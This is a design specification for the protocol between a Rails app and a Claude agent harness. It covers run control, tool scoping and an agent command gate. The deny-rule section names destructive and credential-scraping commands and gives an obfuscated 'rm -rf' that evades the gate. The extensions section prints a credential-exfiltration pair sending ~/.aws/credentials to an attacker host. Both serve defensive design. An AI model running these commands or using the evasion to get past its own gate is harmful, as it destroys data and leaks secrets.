# Contract 2 — Rails ↔ harness protocol (the A↔B seam)

> **Status: FROZEN.** All endpoint signatures, success/error shapes, the worktree convention,
> compose-network addressing, and the auth model are frozen now (no spike dependency). Changes
> after the freeze are recorded in [`CHANGELOG.md`](./CHANGELOG.md); an endpoint-signature change
> is **breaking** (major bump).

This is the seam between `api/` (Rails) and `harness/` (Node + Agent SDK). Rails drives run
control; the harness streams results back. Every result on the harness→Rails side is a
[Contract-1 event envelope](./events.md) — there are no bespoke message shapes.

## 1. Addressing — no hard-coded hosts

- Rails reaches the harness at **`HARNESS_URL`** (default `http://harness:8787` over the Docker
  compose network).
- The harness reaches Rails at a configurable **callback base URL** (`RAILS_INTERNAL_URL`,
  default `http://rails:3000`).

No component hard-codes a fixed host or assumes loopback, so remote/Tailscale operation remains a
future drop-in (publish/forward + origins, no app change).

## 2. Rails → harness (run control)

Base: `HARNESS_URL`. These are **not** authenticated by the shared secret (they ride the private
compose network); the bearer secret guards the harness→Rails callbacks (§3).

### `POST /runs` — start a run

Body (at least):

| field | type | notes |
|---|---|---|
| `run_id` | string | the `ai_run_id` Rails assigned |
| `session_id` | string | |
| `repo_path` | string | the **session worktree** path; pinned as the run's `cwd` |
| `prompt` | string | the initiating prompt |
| `requested_by` | string | originating participant id — stamped as `actor.id` on `run_started` |
| `claude_session_id` | string? | optional; resume a prior Claude session (revise only) |
| `model` | string? | optional model override |
| `max_turns` | integer? | optional |
| `permission_mode` | string | one of `plan` / `acceptEdits` / `bypassPermissions`; default `acceptEdits` when omitted (see §5) |
| `disallowed_tools` | string[]? | built-in tool ids to hard-disable (→ SDK `disallowedTools`; see §5). Omitted = nothing disabled |
| `connectors` | string[]? | host-configured MCP server names to enable (see §5). Omitted = none |
| `skills` | `"all"` \| string[]? | discovered skills to enable (see §5). Omitted = none |

Responses:
- **`202 Accepted`** `{ "run_id": "...", "status": "running" }` — the run proceeds
  asynchronously; events arrive via the callback (§3). The success shape is part of the frozen
  contract, not only the errors.
- **`409 Conflict`** — a run is already active for the session; the harness does **not** start a
  second run.

`run_started` carries `actor = { kind: "user", id: <requested_by> }`.

### `POST /runs/:id/messages` — follow-up into a live run

Body: `{ "message": "<text>", "requested_by": "<participant id>" }`.

The follow-up is **pushed into the run's live streaming-input iterable without respawning** the
run. `requested_by` is the attribution carried onto any follow-up-driven event's `actor.id`.

Responses: **`200`** `{ "run_id": "...", "accepted": true }`; **`404`** if the run is unknown;
**`409`** if the run is not in a state that accepts input.

### `POST /runs/:id/interrupt` — interrupt a live run

Body: `{ "requested_by": "<participant id>" }` — interrupt is a **human** action, so the resulting
`run_interrupted` event is attributed to that user (unlike the system-attributed
`run_finished`/`run_failed`).

Responses: **`200`** `{ "run_id": "...", "accepted": true }`; **`404`**/**`409`** when the run is
unknown or not interruptible.

### `GET /runs` — the authoritative active-run list

**`200`** `{ "runs": [{ "run_id", "session_id", "lane", "store_seq" }] }`, read from the
`run.position` registers rather than inferred from the log.

This is the ** reconciliation source**: on boot Rails calls it and reconciles
`ai_runs` to the answer. **The harness wins**, because it holds the record and Rails holds
a projection of it.

> **`POST /runs/:id/permission_mode` was REMOVED** (CHANGELOG B2). Permission modes were an
> Agent SDK concept; the gate is now `tool:before` (§5). Supplying the old route gets a
> `404`, and a test asserts that — a removal nothing tests is a removal that comes back.

### `GET /healthz` — liveness + active runs

**`200`** `{ "active_run_ids": ["run_...", ...] }`. Same key name as the heartbeat (§3) — the
concept is named once.

## 3. Harness → Rails (callbacks)

Base: `RAILS_INTERNAL_URL`. **Both** callbacks are authenticated with a **bearer
`HARNESS_SHARED_SECRET`**, compared with a **constant-time comparison** to resist timing attacks
(the rule is inherited from one place by every bearer-verifying endpoint). A missing or invalid
bearer is rejected **`401`** and ingests nothing.

> The only statuses these callbacks are contract-defined to return are **`200`**, **`422`**
> (`/internal/events` malformed batch), and **`401`**. `403`/`404` are **not** contract-defined
> here — the bearer-authed internal callbacks do not run `SessionPolicy` — so a `403`/`404` can
> only mean a misconfiguration/misroute, and the harness MAY treat it defensively as fatal.

### `POST /internal/events` — batched, idempotent event ingest

Request body is a **named object** `{ "events": Event[] }` (not a bare top-level array — so the
envelope can carry future sibling fields additively). Each element is a Contract-1 envelope.

- Idempotent per the `(ai_run_id, seq)` rule ([events.md §5](./events.md)).
- **Best-effort per event** within a parseable batch: each valid event is upserted independently
  (duplicates skipped), so one already-persisted event does **not** reject the batch.
- **`200`** `{ "accepted": <n>, "skipped": <n> }` — `skipped` counts duplicates deduped on
  `(ai_run_id, seq)`.
- **`422`** — a **malformed** batch (unparseable body, missing `events`, or an element missing
  required envelope fields) is rejected and **ingests nothing**. (A null `id`/`seq` on an ephemeral
  event is **valid**, not malformed.)
- `409` is reserved for run-start conflicts and is **not** used by this endpoint.

### `POST /internal/harness/heartbeat` — every 5 s

Request body: `{ "active_run_ids": ["run_...", ...] }`. **`200`** `{ "ok": true }` on success.

## 4. Worktree convention & `base_sha`

- **Rails** creates the worktree at **`<repo>/.clawdparty/worktrees/session-<id>`** on branch
  **`clawd/session-<id>`**. The harness receives this path as the run's `cwd` and **must not**
  create or relocate it.
- **`base_sha`** is recorded at run start (for later diff/changeset computation).
- The worktree path **must be identical inside the Rails and harness containers** (both
  bind-mount the target repo at the same path) — git worktrees record absolute `.git` paths.

## 5. Tool scoping and the command gate at run start

**`permission_mode` is GONE** (CHANGELOG B2). It was an Agent SDK concept: the SDK owned
the loop, so the mode was the only lever over what a tool call could do. The harness owns
the loop now, so the lever is the **`tool:before` extension point** plus the per-run tool
set — both of which are ours and both of which are testable.

**`allowed_tools` is GONE too** (CHANGELOG), and for a sharper reason: it was not merely
superseded, it was never read. The harness accepted the field from the day the SDK left and no code
path consulted it, so Rails computed and sent a whitelist that changed nothing. An allow-list only
*pre-approves* in any case — the two things that actually bound a tool call are the `tool:before`
gate and dropping a declaration outright (`disallowed_tools`).

**`cwd` is still pinned to the session worktree.**

### The four extension points

Named places in the loop where registered code observes, transforms, or refuses work.
`tool:before` is the command gate — the role `permissions.ts` was documented as filling
and never could, because nothing imported it .

| Point | Signature | May |
|---|---|---|
| `request:before` | `(RequestCtx) => Outcome<RequestCtx>` | rewrite the claimed messages, or refuse the turn |
| `tool:before` | `(ToolCallCtx) => Outcome<ToolCallCtx>` | **refuse or transform a tool call** |
| `tool:after` | `(ToolResultCtx) => Outcome<ToolResultCtx>` | transform the result the model sees |
| `run:complete` | `(RunOutcomeCtx) => void` | **observe only** — nothing left to refuse, and failing the terminal transaction would strand the run |

`Outcome<T>` is `continue` (pass through, possibly transformed) · `refuse` (deny, surfaced
as `tool_refused`) · `replace` (short-circuit with a substitute).

### Resolution order

Priority **bands**, ascending; registration order **within** a band:

| Band | Priority |
|---|---|
| bundled | `0` |
| first-party plugin | `50` |
| third-party plugin | `100` |

**Never load order**. Load order is an accident of the filesystem, so a
conflict resolved by it resolves differently on someone else's machine.

- **Refusal wins** and short-circuits; a later handler cannot un-refuse.
- **Transforms compose** — `continue` passes the transformed value onward.
- **`replace` short-circuits**; remaining handlers are skipped.
- **Failure is contained** — a throw is caught, logged with the contributor's identity,
  and treated per the table below. It never terminates the run .
- **Removal is total** — unregistering clears every binding *and* the strike history, so
  a re-enabled plugin is not disabled by a previous session .

### Time bounds and what happens on expiry

| Point | Bound | On timeout or throw |
|---|---|---|
| `request:before` | 5s | `continue` |
| **`tool:before`** | **30s** | **`refuse` — FAILS CLOSED** |
| `tool:after` | 5s | `continue` |
| `run:complete` | 5s | `continue` |

`tool:before` gets 30s because it may await a human approval, and it fails **closed**.
That asymmetry is the one worth stating outright: a hung approval gate must not silently
permit the command it was installed to gate. A fail-closed refusal names the handler that
broke, so it does not read as the model being blocked for no reason.

**Three failures or timeouts in one session auto-disables that contributor** for the
session and records it . It stops being invoked at all, rather than being invoked
and ignored.

### The bundled reference rule is not a security boundary

`harness/src/extensions/rules/deny_destructive_bash.ts` catches the obvious accident —
`rm -rf /`, force-push, `curl | sh`, scraping `env` for credentials. It cannot be
exhaustive: `$(printf 'r''m') -rf /` gets through, and there is a test asserting that it
does, so nobody reads the deny-list and concludes otherwise. Containment is the worktree,
the realpath path rules, and human review.

### Per-run tool / connector / skill scoping (additive)

`POST /runs` additionally accepts three optional, additive fields, each defaulting to today's
behavior when omitted:

- **`disallowed_tools`** — built-in tool ids the user turned OFF. An allow-list only *pre-approves*,
  so the **only true disable** is dropping the declaration, which is what the harness does: the
  registry withholds those tools from the request entirely. **Ids are the harness's own registry
  names** (`read`, `bash`, `str_replace_based_edit_tool`) — see CHANGELOG 1.8.0, where they were the
  Agent SDK's capitalized names that nothing answered to, making the whole field a no-op.
- **`connectors`** — host-configured MCP **server names** to enable. The harness IS the MCP client
  (CHANGELOG 1.9.0): it resolves each name against host-owned config (the session repo's `.mcp.json`
  + `~/.claude.json`), connects (stdio / streamable HTTP / SSE), calls `tools/list`, and registers
  each tool as `mcp__<server>__<tool>` in that RUN's registry — so MCP tools flow through the same
  `tool:before` gate, `tool_started`/`tool_finished` events, and `disallowed_tools` filter as the
  built-ins. The client **never** supplies a server's command/url/headers — only names; an unknown
  name is rejected by Rails (`422`) and, if it reaches the harness, reported as `not_configured`.
  A server that fails or hangs (bounded at 10s) does **not** fail the run.
- **`skills`** — `"all"` or discovered skill names. The harness composes them itself now that the
  SDK's `settingSources` is gone, by PROGRESSIVE DISCLOSURE rather than inlining: the system
  prompt gains a one-line INDEX (name + description, each clipped to 200 chars) and the run gains a
  `skill` tool whose `name` enum is exactly the resolved skills, so a body is loaded only when the
  model decides one applies. Measured on a host with 57 skills: the index + tool schema cost **~4,000
  input tokens per turn** (5,864 vs 1,867 for the identical run with `skills: []`), against roughly
  140,000 to inline every body. A selected name the host does not have is dropped, never indexed —
  the model is never told about a skill it cannot load. The `skill` tool takes a NAME and looks it up
  in a map built by the harness's own scan, and the body read is realpath-contained to that skill's
  root, so a symlinked `SKILL.md` cannot turn the skills directory into a reader for arbitrary files.

The `run_started` event echoes the **resolved** `disallowed_tools` / `connectors` / `skills`
(additive optional payload fields, `CONTRACT_VERSION` 1.4) so the UI reflects a run's real scope,
plus **`connectors_failed`** (`1.9`) — the selected servers that did not load, each with a
CLASSIFICATION (`not_configured` / `timeout` / `failed`) rather than the transport's own message,
which could carry a URL with a token in it. `connectors` lists only what actually loaded.

### Skill writes — `POST /skills` · `POST /skills/remove`

The only harness routes that MUTATE host files. Rails owner-gates them; the harness lands them.

`POST /skills` takes `{ cwd, scope, name, description, body, replace? }`. The name is validated as a
strict single lowercase segment **before** anything touches the filesystem — that is what makes the
write incapable of landing outside `<cwd>/.claude/skills` (scope `project`) or `~/.claude/skills`
(scope `host`), rather than a check applied afterwards. The description is written as a YAML **block
scalar** with every line indented, so a newline (or a line reading `---`) in free text cannot rewrite
the skill's own frontmatter. An existing name is **`422`** unless `replace: true`.

`POST /skills/remove` is a POST because it does not delete: the directory is MOVED to a sibling
`.claude/skills-removed/<name>` (then `-2`, `-3`…, so an earlier removal is never clobbered).
Moving it out of `skills/` rather than renaming in place is the whole point — discovery keys on the
frontmatter `name`, so a `deploy.removed` directory stayed discovered, indexed and loadable.

### Discovery (read-only, `cwd`-scoped)

The harness exposes two read-only discovery endpoints Rails proxies (the built-in **tools** set is a
shared `packages/contracts` constant, not discovered):

- **`GET /connectors?cwd=<path>`** → **`200`** `{ "connectors": [{ "name", "transport" }], "source" }`
  — MCP servers configured for that repo path + `~/.claude`; **name + transport only** (never
  command/url/headers/env/tokens).
- **`GET /skills?cwd=<path>`** → **`200`** `{ "skills": [{ "name", "description" }], "source" }` —
  from scanning `<cwd>/.claude/skills/*/SKILL.md` + `~/.claude/skills/*/SKILL.md` frontmatter.

Neither starts a run. Missing/unparseable config degrades to an empty list with an unavailable
`source` (still `200`); it never throws.

## 6. Entitlement postures, per adapter

 requires each adapter to **document** whether the credential kind it consumes may be used
by a third-party client under that vendor's terms, and requires that posture to be **recorded with
the adapter, not assumed**. It is a per-adapter question and deliberately not a blanket one: an API
key and a cloud-marketplace agreement are unambiguous, while a subscription or enterprise-identity
seat is typically scoped by its vendor to that vendor's own clients.

Each posture below is the literal `entitlement` field on the adapter class, which is the single
source — this table restates it, and `test/adapters/conformance.ts` asserts every adapter declares
one. `owner_decision_required` is a real, expected value and MUST stay distinguishable from `"no"`;
flattening it to a refusal would remove a path the requirement explicitly asks for.

| adapter | `credentialKind` | `thirdPartyClientPermitted` | why |
|---|---|---|---|
| `anthropic-direct` | `api_key` | **yes** | A first-party API key or auth token under standard API terms. Nothing is borrowed. |
| `anthropic-oauth` | `subscription` | **owner_decision_required** ⚠ | The host developer's Claude subscription or enterprise SSO seat. Whether a third-party client may drive it is the account owner's decision, not this app's. |
| `anthropic-bedrock` | `cloud_marketplace` | **yes** | The customer's own AWS account under their own agreement, so no third party borrows a seat. |
| `bedrock-converse` | `cloud_marketplace` | **yes** | Same AWS account and agreement as above, reached through Converse instead of the Messages surface. |

### ⚠ The one posture needing owner sign-off

**`anthropic-oauth` is the only `owner_decision_required` adapter**, and it is the one 's
sign-off requirement is about. Two consequences that are already true in the code:

- The harness does not decide for the owner. The adapter is registered and discoverable; whether to
  use it is a choice made per run by picking a model under that provider, and the composer groups
  models by provider precisely so that choice is visible .
- The credential is never minted or stored by this app . On macOS a subscription/enterprise
  OAuth token lives in the **Keychain** rather than a file, which is why the runbook has the
  developer run `claude setup-token` once and export `CLAUDE_CODE_OAUTH_TOKEN` — the app reads what
  is already there and nothing else.

Adding an adapter whose posture is `no` would be a **product decision, not an implementation
detail**: the registry would happily load it, and nothing in the loop consults `entitlement` to
gate a run. That is deliberate — the field exists to be READ BY A HUMAN before an adapter ships,
and a runtime check would imply the harness can adjudicate vendor terms, which it cannot.

## 7. Run cost — the host's price table

`run_finished` / `run_failed` carry `total_cost_usd`. It is **`null` when the model has no price**,
never `0`: zero would claim a request that was actually made was free, and that claim would be
believed. A priced model with genuinely zero tokens does report `0` — the two are different facts.

Prices come from a file the HOST owns, not from this repo:

```
~/.config/clawdparty/pricing.json          # default
HARNESS_PRICING_FILE=/path/to/pricing.json # override
```

```json
{
  "claude-sonnet-4-6": { "input": 3, "output": 15, "cacheRead": 0.3, "cacheWrite": 3.75 },
  "claude-opus-4-8":   { "input": 15, "output": 75 }
}
```

Rates are **dollars per million tokens**, the unit every vendor publishes. `cacheRead` and
`cacheWrite` are optional and fall back to the `input` rate — the conservative reading of an
incomplete row, and stated rather than silently zero. On a long session cache reads dominate, so a
table that omits them overstates the cost of exactly the sessions this app is for.

**Key matching.** An exact model id wins; otherwise the **longest** key the id contains wins, so one
entry covers a model across access paths (`claude-sonnet-4-6` also prices
`global.anthropic.claude-sonnet-4-6` and `us.anthropic.claude-sonnet-4-6-…`). Longest-match is
deliberate: with both `claude-opus-4` and `claude-opus-4-8` present, first-match would price Opus
4.8 at Opus 4's rate.

**Failure is always the safe direction.** No file, malformed JSON, a directory where the file should
be, a row missing a rate, a negative rate — each degrades to "this model is unpriced", i.e. `null`.
A bad price file never fails a run.

**No prices ship in this repo, deliberately.** They vary by region and by contract, they change, and
a figure nobody verified would be reported as fact. The table is visibly the host's to maintain.

**On automating it.** The AWS Price List API *does* serve Bedrock — service code `AmazonBedrock`;
the earlier note that Bedrock exposes no pricing API was wrong. Measured on this host it returns
`AccessDeniedException … not authorized to perform: pricing:GetProducts`, an authorization failure
rather than an unknown service. So the path is real: grant `pricing:GetProducts`, add
`@aws-sdk/client-pricing`, and populate the table per region from the API. It is not done here
because it needs an IAM change this host does not have, and it would price only the Bedrock paths —
the first-party ones still need a table.

## 8. Lanes

A **lane** is a named cursor into a session's shared history that owns its own position and at most
one active run. Every session has a `main` lane; a second lane is what lets two people work at once
instead of taking turns.

### One active run per LANE

`POST /runs` refuses a second run **in the same lane** with `409 { "error": "run_active" }`, and
accepts one in a different lane. Rails enforces the same rule and the database is the backstop:
`index_ai_runs_one_active_per_lane` is unique on `(session_id, lane)` where the status is
`queued`/`running`/`awaiting_review`. It replaces `index_ai_runs_one_active_per_session` — keeping
both would re-impose exactly the constraint  lifts.

### Lane names are validated, because they reach a path and a ref

`lane` must match `/\A[a-z0-9](?:[a-z0-9-]{0,30}[a-z0-9])?\z/` — one segment, lowercase
alphanumeric with internal hyphens, 1-32 characters. An invalid lane is **`422`** naming the rule.

This is a security boundary, not tidiness: the lane becomes part of a filesystem path AND a git
branch name, so `../evil` would resolve a worktree outside `.clawdparty/worktrees`. Names are
**rejected rather than sanitised** — a sanitised name silently addresses a different lane than the
caller asked for. A blank or absent lane means "unspecified" and normalises to `main`.

### One worktree and one branch per lane

| lane | worktree | branch |
|---|---|---|
| `main` | `<REPO_ROOT>/.clawdparty/worktrees/session-<id>` | `clawd/session-<id>` |
| other | `<REPO_ROOT>/.clawdparty/worktrees/session-<id>-<lane>` | `clawd/session-<id>-<lane>` |

`main` is deliberately un-suffixed so every session that predates lanes keeps the worktree already on
disk and the branch holding its approved changesets.

**The branch suffix is a HYPHEN, not a slash, and that is not cosmetic.** `clawd/session-7/review`
was the first attempt, and git refuses it — a ref cannot be both a file and a directory:

```
fatal: cannot lock ref 'refs/heads/clawd/session-7': 'refs/heads/clawd/session-7/review' exists
```

Because `main` stays un-suffixed, the slash form is ruled out entirely. The failure would have
arrived the first time anyone opened a second lane.

**Why per-lane trees at all**: a shared worktree cannot satisfy. Finalize computes a changeset
from the whole working tree, so one lane's review would contain another's in-flight edits; and
reject runs `reset --hard && clean -fd`, which would DELETE another lane's unreviewed work.

### `lane.leaf` and `lane.state`

Two store registers, keyed by lane name:

- **`lane.leaf`** `{ storeSeq }` — where this lane's history ends. Advanced to the transaction's
  highest `store_seq` **inside that same transaction**, which is what "serialize lanes at the commit
  boundary, not the run boundary" means: a concurrent lane can never observe entries no leaf covers,
  nor a leaf pointing past entries that rolled back. Only advanced when the commit actually wrote
  history — a register-only or fully-deduplicated commit leaves it alone rather than claiming
  history the lane does not have.
- **`lane.state`** `{ currentRunId, pendingNext }` — who owns the lane right now. Claimed at run
  start and released at run end **in the record**, so a crash does not leave a lane owned by a
  finished run. `pendingNext` is reserved for the queue-behind case and stays `null`.

Both are written through `laneScoped(store, lane)`, a view that stamps the lane on every commit. One
store serves every lane in a session (refcounted), so the lane cannot live on the store — and the
loop has eleven commit sites, which makes per-site stamping a design where missing one is silent.

### Cross-lane conflicts are REPORTED, never resolved

`GET /api/runs/:id/diff` gains `lane` and `conflicts`:

```json
{ "lane": "review",
  "conflicts": [{ "path": "app/models/user.rb", "lane": "main", "kind": "unreviewed" }] }
```

`kind` is `unreviewed` (another lane's changeset is still waiting on that file) or `approved` (its
change is already committed, so this changeset is built on a version the session has moved past).
`conflicts` is always present and empty for a single-lane session, so a client need not distinguish
"none" from "not reported".

Nothing merges them. With a tree and a branch per lane, git never sees the two changes meet — no
merge conflict, no warning — so this report is the only place the overlap becomes visible, and the
reviewer decides. An unreadable sibling lane (pruned by `bin/worktrees`, moved, never created)
contributes nothing rather than failing the diff.

## 9. Reading the macOS Keychain

 names the Keychain as a location a container cannot reach, and it is the only place a macOS
subscription/enterprise OAuth credential lives — there is no file. It is therefore one of the
reasons the harness runs as a host process at all.

**Existence only. The harness never reads the secret.**

```
/usr/bin/security find-generic-password -s "Claude Code-credentials"
```

No `-w`, which is the flag that prints the password, and `stdio: "ignore"` on every stream. That is
sufficient because `anthropic_oauth.client()` constructs the vendor client with **no token** for this
path — the SDK resolves the credential itself — so discovery only ever needs to know whether there is
one. Reading the value would put a credential in this process for no purpose .

**The service name is measured, not assumed.** It was `"Claude Code"` in the source, which finds
nothing; the real item is `"Claude Code-credentials"`. So the slot was broken twice over — its probe
defaulted to `false` AND it would have queried a name that never matches.

**Why a credential module may start a process.** `no_shell_input.test.ts` used to require every
process-starter to live under `tools/`. That was a proxy for the property that matters, and wrong in
both directions: a file under `tools/` can still build a shell string, and a legitimate starter
elsewhere would be refused on its path. The rule is now **on the allowlist AND argv form with no
interpolated input**, applied to every starter rather than to the three that had bespoke assertions —
so a new one inherits the check. The allowlist is still asserted as an equality, so adding a row
remains a visible decision.

**Failure is always "this slot cannot serve".** Missing binary, locked keychain, timeout, exit 44
(`security`'s item-not-found) — each returns false rather than throwing, because discovery walks a
precedence list and one slot failing must let the next be tried.

**Precedence is unchanged.** `CLAUDE_CODE_OAUTH_TOKEN` still wins, so a developer who exported it
deliberately is not overridden by a stale Keychain item, and the documented file/profile slots still
sit above the Keychain.

## 10. Extensions — bundled only

A contributor registers a handler at one of the four extension points. Per session, an owner may turn
one on or off; every participant can see which are in force, because a `tool:before` gate decides
what Claude may do.

### There is no install endpoint, and that is a decision

Measurement of a `worker_thread` with `env: {}` settled it. The environment half holds — no credentials in
`process.env`, and a spawned child does not inherit them either. Everything else does not: code
inside one read `~/.claude.json` and the credential module's own source, ran `child_process.execSync`,
and had `fetch` and `SharedArrayBuffer`. So `execSync("cat ~/.aws/credentials")` + `fetch(attacker)`
defeats the arrangement in two lines.

** is therefore satisfied by construction rather than by enforcement**: no code path loads
foreign code. `npm run test:plugin-adversarial` asserts that absence across six mechanisms
(`worker_threads`, `node:vm`, a computed dynamic `import`, `createRequire`, `eval`, `new Function`),
with a non-vacuity check per pattern, and asserts that `host.ts` exports no `install`, `discover` or
`uninstall`. **If third-party support is ever wanted, that gate fails first** — which is the intended
design review.

### Endpoints

- **`GET /plugins?session_id=<id>`** → `{ plugins: [{ id, version, origin, contractVersion,
  contributes, summary, enabled }] }`. `enabled` is `null` when no session is named — distinct from
  `false`, which would claim it is off.
- **`POST /sessions/:id/plugins`** `{ plugin_id, enabled }` → `200 { plugin_id, enabled, active }`,
  or **`422`** `{ error: "plugin_refused", message }` for an unknown id or an incompatible contract
  version. Returns the RESOLVED set so Rails can put it on the event without asking again.

Rails gates first (`:view` to read, `:manage_session` to change) and the harness re-checks the id and
the contract version regardless, because the harness owns the record and must not write an enablement
it cannot honour.

### The record/event split

The harness writes the **record** (`session.plugins`); Rails appends the **event**
(`plugin_enabled` / `plugin_disabled`). Not an arbitrary division: the harness allocates per-RUN
`seq`, and a plugin toggle belongs to no run. `skill_changed` works the same way for the same reason.

The DESCRIPTOR is copied into the register rather than referenced , so a session stays
readable after a contributor leaves the build — and an entry this build no longer ships is inert
rather than fatal, while the register still holds what it named.

### Contract-version refusal

Exact `major`, and `minor` at least what the contributor needs — the same rule consumers apply to
`CONTRACT_VERSION`. An incompatible contributor is refused with a reason and never partially loaded:
one that half-works leaves the room unable to tell which of its rules are in force.

### When a toggle takes effect

**At the next run start.** The set is resolved once, like the tool set and the skill set. A mid-run
change would make "which rules applied to this tool call" ambiguous even with a fresh
`request_header`, since the header is per-turn and a call is finer-grained. The urgent case — stop
what is happening now — is INTERRUPT, which is immediate and unambiguous. The panel says this, because
a toggle that appears not to work is worse than one that explains its timing.

R7's prompt-cache constraint does not apply: contributors register handlers, not tools, so no tool
declaration changes and no cache prefix shifts.

